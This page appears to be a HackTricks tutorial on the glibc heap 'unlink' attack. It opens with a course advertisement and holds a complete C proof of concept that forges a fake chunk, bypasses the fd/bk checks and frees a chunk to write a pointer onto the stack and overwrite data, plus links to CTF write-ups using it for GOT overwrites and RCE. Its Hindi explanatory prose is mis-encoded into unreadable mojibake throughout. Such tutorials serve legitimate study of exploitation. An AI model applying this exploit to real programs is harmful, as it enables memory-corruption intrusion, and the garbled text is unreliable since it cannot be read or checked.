# Unlink Attack

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

‡§ú‡§¨ ‡§Ø‡§π ‡§π‡§Æ‡§≤‡§æ ‡§ñ‡•ã‡§ú‡§æ ‡§ó‡§Ø‡§æ ‡§•‡§æ, ‡§§‡•ã ‡§á‡§∏‡§®‡•á ‡§ú‡•ç‡§Ø‡§æ‡§¶‡§æ‡§§‡§∞ WWW (Write What Where) ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•Ä, ‡§π‡§æ‡§≤‡§æ‡§Å‡§ï‡§ø, ‡§ï‡•Å‡§õ **‡§ú‡§æ‡§Ç‡§ö‡•á‡§Ç ‡§ú‡•ã‡§°‡§º‡•Ä ‡§ó‡§à‡§Ç** ‡§ú‡§ø‡§∏‡§∏‡•á ‡§π‡§Æ‡§≤‡•á ‡§ï‡•á ‡§®‡§è ‡§∏‡§Ç‡§∏‡•ç‡§ï‡§∞‡§£ ‡§ï‡•ã ‡§Ö‡§ß‡§ø‡§ï ‡§¶‡§ø‡§≤‡§ö‡§∏‡•ç‡§™, ‡§Ö‡§ß‡§ø‡§ï ‡§ú‡§ü‡§ø‡§≤ ‡§î‡§∞ **‡§µ‡•ç‡§Ø‡§∞‡•ç‡§•** ‡§¨‡§®‡§æ ‡§¶‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ‡•§

### Code Example:

<details>

<summary>Code</summary>
```c
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

// Altered from https://github.com/DhavalKapil/heap-exploitation/tree/d778318b6a14edad18b20421f5a06fa1a6e6920e/assets/files/unlink_exploit.c to make it work

struct chunk_structure {
size_t prev_size;
size_t size;
struct chunk_structure *fd;
struct chunk_structure *bk;
char buf[10];               // padding
};

int main() {
unsigned long long *chunk1, *chunk2;
struct chunk_structure *fake_chunk, *chunk2_hdr;
char data[20];

// First grab two chunks (non fast)
chunk1 = malloc(0x8000);
chunk2 = malloc(0x8000);
printf("Stack pointer to chunk1: %p\n", &chunk1);
printf("Chunk1: %p\n", chunk1);
printf("Chunk2: %p\n", chunk2);

// Assuming attacker has control over chunk1's contents
// Overflow the heap, override chunk2's header

// First forge a fake chunk starting at chunk1
// Need to setup fd and bk pointers to pass the unlink security check
fake_chunk = (struct chunk_structure *)chunk1;
fake_chunk->size = 0x8000;
fake_chunk->fd = (struct chunk_structure *)(&chunk1 - 3); // Ensures P->fd->bk == P
fake_chunk->bk = (struct chunk_structure *)(&chunk1 - 2); // Ensures P->bk->fd == P

// Next modify the header of chunk2 to pass all security checks
chunk2_hdr = (struct chunk_structure *)(chunk2 - 2);
chunk2_hdr->prev_size = 0x8000;  // chunk1's data region size
chunk2_hdr->size &= ~1;        // Unsetting prev_in_use bit

// Now, when chunk2 is freed, attacker's fake chunk is 'unlinked'
// This results in chunk1 pointer pointing to chunk1 - 3
// i.e. chunk1[3] now contains chunk1 itself.
// We then make chunk1 point to some victim's data
free(chunk2);
printf("Chunk1: %p\n", chunk1);
printf("Chunk1[3]: %x\n", chunk1[3]);

chunk1[3] = (unsigned long long)data;

strcpy(data, "Victim's data");

// Overwrite victim's data using chunk1
chunk1[0] = 0x002164656b636168LL;

printf("%s\n", data);

return 0;
}

```
</details>

* ‡§π‡§Æ‡§≤‡§æ ‡§§‡§¨ ‡§ï‡§æ‡§Æ ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§∞‡§§‡§æ ‡§ú‡§¨ tcaches ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à (2.26 ‡§ï‡•á ‡§¨‡§æ‡§¶)

### ‡§≤‡§ï‡•ç‡§∑‡•ç‡§Ø

‡§Ø‡§π ‡§π‡§Æ‡§≤‡§æ **‡§è‡§ï ‡§ö‡§Ç‡§ï ‡§ï‡•á ‡§≤‡§ø‡§è ‡§è‡§ï ‡§™‡•â‡§á‡§Ç‡§ü‡§∞ ‡§ï‡•ã ‡§Ö‡§™‡§®‡•á ‡§∏‡•á 3 ‡§™‡§§‡•á ‡§™‡§π‡§≤‡•á ‡§á‡§Ç‡§ó‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡§æ ‡§π‡•à**‡•§ ‡§Ø‡§¶‡§ø ‡§Ø‡§π ‡§®‡§Ø‡§æ ‡§∏‡•ç‡§•‡§æ‡§® (‡§ú‡§π‡§æ‡§Ç ‡§™‡•â‡§á‡§Ç‡§ü‡§∞ ‡§∏‡•ç‡§•‡§ø‡§§ ‡§•‡§æ) ‡§¶‡§ø‡§≤‡§ö‡§∏‡•ç‡§™ ‡§ö‡•Ä‡§ú‡•á‡§Ç ‡§∞‡§ñ‡§§‡§æ ‡§π‡•à, ‡§ú‡•à‡§∏‡•á ‡§Ö‡§®‡•ç‡§Ø ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ ‡§Ü‡§µ‡§Ç‡§ü‡§® / ‡§∏‡•ç‡§ü‡•à‡§ï..., ‡§§‡•ã ‡§á‡§∏‡•á ‡§™‡§¢‡§º‡§®‡§æ/‡§ì‡§µ‡§∞‡§∞‡§æ‡§á‡§ü ‡§ï‡§∞‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à ‡§ú‡§ø‡§∏‡§∏‡•á ‡§¨‡§°‡§º‡§æ ‡§®‡•Å‡§ï‡§∏‡§æ‡§® ‡§π‡•ã ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§

* ‡§Ø‡§¶‡§ø ‡§Ø‡§π ‡§™‡•â‡§á‡§Ç‡§ü‡§∞ ‡§∏‡•ç‡§ü‡•à‡§ï ‡§Æ‡•á‡§Ç ‡§∏‡•ç‡§•‡§ø‡§§ ‡§•‡§æ, ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø ‡§Ø‡§π ‡§Ö‡§¨ ‡§Ö‡§™‡§®‡•á ‡§∏‡•á 3 ‡§™‡§§‡•á ‡§™‡§π‡§≤‡•á ‡§á‡§Ç‡§ó‡§ø‡§§ ‡§ï‡§∞ ‡§∞‡§π‡§æ ‡§π‡•à ‡§î‡§∞ ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§á‡§∏‡•á ‡§™‡§¢‡§º ‡§î‡§∞ ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à, ‡§§‡•ã ‡§Ø‡§π ‡§∏‡•ç‡§ü‡•à‡§ï ‡§∏‡•á ‡§∏‡§Ç‡§µ‡•á‡§¶‡§®‡§∂‡•Ä‡§≤ ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§≤‡•Ä‡§ï ‡§ï‡§∞‡§®‡•á ‡§Ø‡§æ ‡§Ø‡§π‡§æ‡§Ç ‡§§‡§ï ‡§ï‡§ø ‡§∞‡§ø‡§ü‡§∞‡•ç‡§® ‡§™‡§§‡•á ‡§ï‡•ã ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§∞‡§®‡•á (‡§∂‡§æ‡§Ø‡§¶) ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§ó‡§æ ‡§¨‡§ø‡§®‡§æ ‡§ï‡•à‡§®‡§∞‡•Ä ‡§ï‡•ã ‡§õ‡•Å‡§è‡•§
* CTF ‡§â‡§¶‡§æ‡§π‡§∞‡§£‡•ã‡§Ç ‡§ï‡•á ‡§Ö‡§®‡•Å‡§∏‡§æ‡§∞, ‡§Ø‡§π ‡§™‡•â‡§á‡§Ç‡§ü‡§∞ ‡§Ö‡§®‡•ç‡§Ø ‡§Ü‡§µ‡§Ç‡§ü‡§®‡•ã‡§Ç ‡§ï‡•á ‡§≤‡§ø‡§è ‡§™‡•â‡§á‡§Ç‡§ü‡§∞‡•ç‡§∏ ‡§ï‡•á ‡§è‡§ï ‡§è‡§∞‡•á ‡§Æ‡•á‡§Ç ‡§∏‡•ç‡§•‡§ø‡§§ ‡§π‡•à, ‡§á‡§∏‡§≤‡§ø‡§è, ‡§á‡§∏‡•á 3 ‡§™‡§§‡•á ‡§™‡§π‡§≤‡•á ‡§á‡§Ç‡§ó‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§î‡§∞ ‡§á‡§∏‡•á ‡§™‡§¢‡§º‡§®‡•á ‡§î‡§∞ ‡§≤‡§ø‡§ñ‡§®‡•á ‡§Æ‡•á‡§Ç ‡§∏‡§ï‡•ç‡§∑‡§Æ ‡§π‡•ã‡§®‡•á ‡§ï‡•á ‡§ï‡§æ‡§∞‡§£, ‡§Ø‡§π ‡§Ö‡§®‡•ç‡§Ø ‡§™‡•â‡§á‡§Ç‡§ü‡§∞‡•ç‡§∏ ‡§ï‡•ã ‡§Ö‡§®‡•ç‡§Ø ‡§™‡§§‡•á ‡§™‡§∞ ‡§á‡§Ç‡§ó‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à‡•§\
‡§ö‡•Ç‡§Ç‡§ï‡§ø ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§Ö‡§®‡•ç‡§Ø ‡§Ü‡§µ‡§Ç‡§ü‡§®‡•ã‡§Ç ‡§ï‡•ã ‡§≠‡•Ä ‡§™‡§¢‡§º/‡§≤‡§ø‡§ñ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à, ‡§µ‡§π ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§≤‡•Ä‡§ï ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§Ø‡§æ ‡§Æ‡§®‡§Æ‡§æ‡§®‡•á ‡§∏‡•ç‡§•‡§æ‡§®‡•ã‡§Ç (‡§ú‡•à‡§∏‡•á GOT ‡§Æ‡•á‡§Ç) ‡§Æ‡•á‡§Ç ‡§®‡§è ‡§™‡§§‡•á ‡§ï‡•ã ‡§ì‡§µ‡§∞‡§∞‡§æ‡§á‡§ü ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§

### ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ‡§è‡§Å

* ‡§ï‡•Å‡§õ ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§£ ‡§è‡§ï ‡§Æ‡•á‡§Æ‡•ã‡§∞‡•Ä (‡§ú‡•à‡§∏‡•á ‡§∏‡•ç‡§ü‡•à‡§ï) ‡§Æ‡•á‡§Ç ‡§ï‡•Å‡§õ ‡§µ‡§ø‡§∂‡•á‡§∑‡§§‡§æ‡§ì‡§Ç ‡§ï‡•ã ‡§Æ‡§æ‡§® ‡§¶‡•á‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡•Å‡§õ ‡§ö‡§Ç‡§ï‡•ç‡§∏ ‡§¨‡§®‡§æ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è‡•§
* ‡§®‡§ï‡§≤‡•Ä ‡§ö‡§Ç‡§ï ‡§ï‡•á ‡§™‡•â‡§á‡§Ç‡§ü‡§∞‡•ç‡§∏ ‡§ï‡•ã ‡§∏‡•á‡§ü ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§∏‡•ç‡§ü‡•à‡§ï ‡§≤‡•Ä‡§ï‡•§

### ‡§π‡§Æ‡§≤‡§æ

* ‡§ï‡•Å‡§õ ‡§ö‡§Ç‡§ï‡•ç‡§∏ ‡§π‡•à‡§Ç (chunk1 ‡§î‡§∞ chunk2)
* ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ chunk1 ‡§ï‡•Ä ‡§∏‡§æ‡§Æ‡§ó‡•ç‡§∞‡•Ä ‡§î‡§∞ chunk2 ‡§ï‡•á ‡§π‡•á‡§°‡§∞ ‡§ï‡•ã ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§
* chunk1 ‡§Æ‡•á‡§Ç ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§è‡§ï ‡§®‡§ï‡§≤‡•Ä ‡§ö‡§Ç‡§ï ‡§ï‡•Ä ‡§∏‡§Ç‡§∞‡§ö‡§®‡§æ ‡§¨‡§®‡§æ‡§§‡§æ ‡§π‡•à:
* ‡§∏‡•Å‡§∞‡§ï‡•ç‡§∑‡§æ ‡§ï‡•ã ‡§¨‡§æ‡§Ø‡§™‡§æ‡§∏ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§µ‡§π ‡§∏‡•Å‡§®‡§ø‡§∂‡•ç‡§ö‡§ø‡§§ ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§ï‡§ø `size` ‡§´‡§º‡•Ä‡§≤‡•ç‡§° ‡§∏‡§π‡•Ä ‡§π‡•à ‡§§‡§æ‡§ï‡§ø ‡§§‡•ç‡§∞‡•Å‡§ü‡§ø ‡§∏‡•á ‡§¨‡§ö‡§æ ‡§ú‡§æ ‡§∏‡§ï‡•á: `corrupted size vs. prev_size while consolidating`
* ‡§î‡§∞ ‡§®‡§ï‡§≤‡•Ä ‡§ö‡§Ç‡§ï ‡§ï‡•á `fd` ‡§î‡§∞ `bk` ‡§´‡§º‡•Ä‡§≤‡•ç‡§° chunk1 ‡§™‡•â‡§á‡§Ç‡§ü‡§∞ ‡§ï‡•á ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π‡•Ä‡§§ ‡§∏‡•ç‡§•‡§æ‡§® ‡§™‡§∞ -3 ‡§î‡§∞ -2 ‡§ï‡•á ‡§ë‡§´‡§∏‡•á‡§ü ‡§ï‡•á ‡§∏‡§æ‡§• ‡§á‡§Ç‡§ó‡§ø‡§§ ‡§ï‡§∞ ‡§∞‡§π‡•á ‡§π‡•à‡§Ç ‡§§‡§æ‡§ï‡§ø `fake_chunk->fd->bk` ‡§î‡§∞ `fake_chunk->bk->fd` ‡§Æ‡•á‡§Æ‡•ã‡§∞‡•Ä (‡§∏‡•ç‡§ü‡•à‡§ï) ‡§Æ‡•á‡§Ç ‡§â‡§∏ ‡§∏‡•ç‡§•‡§æ‡§® ‡§ï‡•ã ‡§á‡§Ç‡§ó‡§ø‡§§ ‡§ï‡§∞‡•á‡§Ç ‡§ú‡§π‡§æ‡§Ç ‡§Ö‡§∏‡§≤‡•Ä chunk1 ‡§™‡§§‡§æ ‡§∏‡•ç‡§•‡§ø‡§§ ‡§π‡•à:

<figure><img src="../../.gitbook/assets/image (1245).png" alt=""><figcaption><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit</a></p></figcaption></figure>

* chunk2 ‡§ï‡•á ‡§π‡•á‡§°‡§∞ ‡§ï‡•ã ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à ‡§§‡§æ‡§ï‡§ø ‡§Ø‡§π ‡§∏‡§Ç‡§ï‡•á‡§§ ‡§Æ‡§ø‡§≤‡•á ‡§ï‡§ø ‡§™‡§ø‡§õ‡§≤‡•á ‡§ö‡§Ç‡§ï ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§®‡§π‡•Ä‡§Ç ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§π‡•à ‡§î‡§∞ ‡§ï‡§ø ‡§Ü‡§ï‡§æ‡§∞ ‡§®‡§ï‡§≤‡•Ä ‡§ö‡§Ç‡§ï ‡§ï‡§æ ‡§Ü‡§ï‡§æ‡§∞ ‡§π‡•à‡•§
* ‡§ú‡§¨ ‡§¶‡•Ç‡§∏‡§∞‡§æ ‡§ö‡§Ç‡§ï ‡§Æ‡•Å‡§ï‡•ç‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à ‡§§‡•ã ‡§Ø‡§π ‡§®‡§ï‡§≤‡•Ä ‡§ö‡§Ç‡§ï ‡§Ö‡§®‡§≤‡§ø‡§Ç‡§ï ‡§π‡•ã ‡§ú‡§æ‡§§‡§æ ‡§π‡•à:
* `fake_chunk->fd->bk` = `fake_chunk->bk`
* `fake_chunk->bk->fd` = `fake_chunk->fd`
* ‡§™‡§π‡§≤‡•á ‡§Ø‡§π ‡§∏‡•Å‡§®‡§ø‡§∂‡•ç‡§ö‡§ø‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§•‡§æ ‡§ï‡§ø `fake_chunk->fd->bk` ‡§î‡§∞ `fake_chunk->bk->fd` ‡§è‡§ï ‡§π‡•Ä ‡§∏‡•ç‡§•‡§æ‡§® (‡§∏‡•ç‡§ü‡•à‡§ï ‡§Æ‡•á‡§Ç ‡§ú‡§π‡§æ‡§Ç `chunk1` ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π‡•Ä‡§§ ‡§•‡§æ, ‡§á‡§∏‡§≤‡§ø‡§è ‡§Ø‡§π ‡§è‡§ï ‡§Æ‡§æ‡§®‡•ç‡§Ø ‡§≤‡§ø‡§Ç‡§ï‡•ç‡§° ‡§≤‡§ø‡§∏‡•ç‡§ü ‡§•‡•Ä) ‡§ï‡•ã ‡§á‡§Ç‡§ó‡§ø‡§§ ‡§ï‡§∞ ‡§∞‡§π‡•á ‡§•‡•á‡•§ ‡§ö‡•Ç‡§Ç‡§ï‡§ø **‡§¶‡•ã‡§®‡•ã‡§Ç ‡§è‡§ï ‡§π‡•Ä ‡§∏‡•ç‡§•‡§æ‡§® ‡§ï‡•ã ‡§á‡§Ç‡§ó‡§ø‡§§ ‡§ï‡§∞ ‡§∞‡§π‡•á ‡§π‡•à‡§Ç**, ‡§ï‡•á‡§µ‡§≤ ‡§Ö‡§Ç‡§§‡§ø‡§Æ (`fake_chunk->bk->fd = fake_chunk->fd`) **‡§™‡•ç‡§∞‡§≠‡§æ‡§µ** ‡§°‡§æ‡§≤‡•á‡§ó‡§æ‡•§
* ‡§Ø‡§π **‡§∏‡•ç‡§ü‡•à‡§ï ‡§Æ‡•á‡§Ç chunk1 ‡§ï‡•á ‡§≤‡§ø‡§è ‡§™‡•â‡§á‡§Ç‡§ü‡§∞ ‡§ï‡•ã ‡§â‡§∏ ‡§™‡§§‡•á (‡§Ø‡§æ ‡§¨‡§æ‡§á‡§ü‡•ç‡§∏) ‡§ï‡•ã ‡§ì‡§µ‡§∞‡§∞‡§æ‡§á‡§ü ‡§ï‡§∞‡•á‡§ó‡§æ ‡§ú‡•ã ‡§∏‡•ç‡§ü‡•à‡§ï ‡§Æ‡•á‡§Ç 3 ‡§™‡§§‡•á ‡§™‡§π‡§≤‡•á ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π‡•Ä‡§§ ‡§π‡•à**‡•§
* ‡§á‡§∏‡§≤‡§ø‡§è, ‡§Ø‡§¶‡§ø ‡§è‡§ï ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ chunk1 ‡§ï‡•Ä ‡§∏‡§æ‡§Æ‡§ó‡•ç‡§∞‡•Ä ‡§ï‡•ã ‡§´‡§ø‡§∞ ‡§∏‡•á ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à, ‡§§‡•ã ‡§µ‡§π **‡§∏‡•ç‡§ü‡•à‡§ï ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ ‡§≤‡§ø‡§ñ‡§®‡•á ‡§Æ‡•á‡§Ç ‡§∏‡§ï‡•ç‡§∑‡§Æ ‡§π‡•ã‡§ó‡§æ** ‡§ú‡§ø‡§∏‡§∏‡•á ‡§µ‡§π ‡§∏‡§Ç‡§≠‡§æ‡§µ‡§ø‡§§ ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§∞‡§ø‡§ü‡§∞‡•ç‡§® ‡§™‡§§‡•á ‡§ï‡•ã ‡§ì‡§µ‡§∞‡§∞‡§æ‡§á‡§ü ‡§ï‡§∞ ‡§∏‡§ï‡•á‡§ó‡§æ, ‡§ï‡•à‡§®‡§∞‡•Ä ‡§ï‡•ã ‡§õ‡•ã‡§°‡§º‡§ï‡§∞ ‡§î‡§∞ ‡§∏‡•ç‡§•‡§æ‡§®‡•Ä‡§Ø ‡§ö‡§∞ ‡§ï‡•á ‡§Æ‡§æ‡§® ‡§î‡§∞ ‡§¨‡§ø‡§Ç‡§¶‡•Å‡§ì‡§Ç ‡§ï‡•ã ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡•á‡§ó‡§æ‡•§ ‡§Ø‡§π‡§æ‡§Ç ‡§§‡§ï ‡§ï‡§ø ‡§∏‡•ç‡§ü‡•à‡§ï ‡§Æ‡•á‡§Ç ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π‡•Ä‡§§ chunk1 ‡§ï‡•á ‡§™‡§§‡•á ‡§ï‡•ã ‡§è‡§ï ‡§Ö‡§≤‡§ó ‡§∏‡•ç‡§•‡§æ‡§® ‡§™‡§∞ ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡•á‡§ó‡§æ ‡§ú‡§π‡§æ‡§Ç ‡§Ø‡§¶‡§ø ‡§π‡§Æ‡§≤‡§æ‡§µ‡§∞ ‡§´‡§ø‡§∞ ‡§∏‡•á chunk1 ‡§ï‡•Ä ‡§∏‡§æ‡§Æ‡§ó‡•ç‡§∞‡•Ä ‡§ï‡•ã ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ ‡§ï‡§∞ ‡§∏‡§ï‡•á ‡§§‡•ã ‡§µ‡§π ‡§ï‡§π‡•Ä‡§Ç ‡§≠‡•Ä ‡§≤‡§ø‡§ñ ‡§∏‡§ï‡•á‡§ó‡§æ‡•§
* ‡§ß‡•ç‡§Ø‡§æ‡§® ‡§¶‡•á‡§Ç ‡§ï‡§ø ‡§Ø‡§π ‡§∏‡§Ç‡§≠‡§µ ‡§•‡§æ ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø **‡§™‡§§‡•á ‡§∏‡•ç‡§ü‡•à‡§ï ‡§Æ‡•á‡§Ç ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π‡•Ä‡§§ ‡§π‡•ã‡§§‡•á ‡§π‡•à‡§Ç**‡•§ ‡§ú‡•ã‡§ñ‡§ø‡§Æ ‡§î‡§∞ ‡§∂‡•ã‡§∑‡§£ ‡§á‡§∏ ‡§™‡§∞ ‡§®‡§ø‡§∞‡•ç‡§≠‡§∞ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§ï‡§ø **‡§®‡§ï‡§≤‡•Ä ‡§ö‡§Ç‡§ï ‡§ï‡•á ‡§™‡§§‡•á ‡§ï‡§π‡§æ‡§Ç ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π‡•Ä‡§§ ‡§π‡•à‡§Ç**‡•§

<figure><img src="../../.gitbook/assets/image (1246).png" alt=""><figcaption><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit</a></p></figcaption></figure>

## ‡§∏‡§Ç‡§¶‡§∞‡•ç‡§≠

* [https://heap-exploitation.dhavalkapil.com/attacks/unlink\_exploit](https://heap-exploitation.dhavalkapil.com/attacks/unlink\_exploit)
* ‡§π‡§æ‡§≤‡§æ‡§Ç‡§ï‡§ø CTF ‡§Æ‡•á‡§Ç ‡§è‡§ï ‡§Ö‡§®‡§≤‡§ø‡§Ç‡§ï ‡§π‡§Æ‡§≤‡§æ ‡§¢‡•Ç‡§Ç‡§¢‡§®‡§æ ‡§Ö‡§ú‡•Ä‡§¨ ‡§π‡•ã‡§ó‡§æ, ‡§Ø‡§π‡§æ‡§Ç ‡§ï‡•Å‡§õ ‡§≤‡•á‡§ñ ‡§π‡•à‡§Ç ‡§ú‡§π‡§æ‡§Ç ‡§á‡§∏ ‡§π‡§Æ‡§≤‡•á ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§•‡§æ:
* CTF ‡§â‡§¶‡§æ‡§π‡§∞‡§£: [https://guyinatuxedo.github.io/30-unlink/hitcon14\_stkof/index.html](https://guyinatuxedo.github.io/30-unlink/hitcon14\_stkof/index.html)
* ‡§á‡§∏ ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§Æ‡•á‡§Ç, ‡§∏‡•ç‡§ü‡•à‡§ï ‡§ï‡•á ‡§¨‡§ú‡§æ‡§Ø malloc'ed ‡§™‡§§‡•á ‡§ï‡§æ ‡§è‡§ï ‡§è‡§∞‡•á ‡§π‡•à‡•§ ‡§Ö‡§®‡§≤‡§ø‡§Ç‡§ï ‡§π‡§Æ‡§≤‡§æ ‡§Ø‡§π‡§æ‡§Ç ‡§è‡§ï ‡§ö‡§Ç‡§ï ‡§Ü‡§µ‡§Ç‡§ü‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à, ‡§á‡§∏‡§≤‡§ø‡§è malloc'ed ‡§™‡§§‡•á ‡§ï‡•á ‡§è‡§∞‡•á ‡§ï‡•á ‡§™‡•â‡§á‡§Ç‡§ü‡§∞‡•ç‡§∏ ‡§ï‡•ã ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§Æ‡•á‡§Ç ‡§∏‡§ï‡•ç‡§∑‡§Æ ‡§π‡•ã‡§®‡§æ‡•§ ‡§´‡§ø‡§∞, ‡§è‡§ï ‡§î‡§∞ ‡§ï‡§æ‡§∞‡•ç‡§Ø‡§ï‡•ç‡§∑‡§Æ‡§§‡§æ ‡§π‡•à ‡§ú‡•ã ‡§á‡§® ‡§™‡§§‡•á ‡§Æ‡•á‡§Ç ‡§ö‡§Ç‡§ï‡•ç‡§∏ ‡§ï‡•Ä ‡§∏‡§æ‡§Æ‡§ó‡•ç‡§∞‡•Ä ‡§ï‡•ã ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡•Ä ‡§π‡•à, ‡§ú‡•ã GOT ‡§ï‡•á ‡§™‡§§‡•á ‡§ï‡•ã ‡§á‡§Ç‡§ó‡§ø‡§§ ‡§ï‡§∞‡§®‡•á, ‡§ï‡§æ‡§∞‡•ç‡§Ø ‡§´‡§º‡§Ç‡§ï‡•ç‡§∂‡§® ‡§ï‡•á ‡§™‡§§‡•á ‡§ï‡•ã ‡§∏‡§Ç‡§∂‡•ã‡§ß‡§ø‡§§ ‡§ï‡§∞‡§®‡•á, ‡§≤‡•Ä‡§ï ‡§î‡§∞ RCE ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§§‡•Ä ‡§π‡•à‡•§
* ‡§è‡§ï ‡§î‡§∞ CTF ‡§â‡§¶‡§æ‡§π‡§∞‡§£: [https://guyinatuxedo.github.io/30-unlink/zctf16\_note2/index.html](https://guyinatuxedo.github.io/30-unlink/zctf16\_note2/index.html)
